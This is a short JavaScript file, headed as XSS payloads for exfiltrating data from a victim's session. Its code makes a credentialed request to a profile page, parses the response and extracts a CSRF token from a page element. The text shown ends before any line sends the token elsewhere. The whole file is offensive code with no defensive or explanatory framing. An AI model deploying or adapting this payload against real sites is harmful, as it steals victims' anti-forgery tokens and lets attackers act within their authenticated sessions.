/**
 * XSS payloads to exfiltrate data from victim's session
 * 
 */

// Get content from element by ID
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://example.com/profile.php', false);
xhr.withCredentials = true;
xhr.send();
var doc = new DOMParser().parseFromString(xhr.responseText, 'text/html');
var csrftoken = encodeURIComponent(doc.getElementById('target_id').value);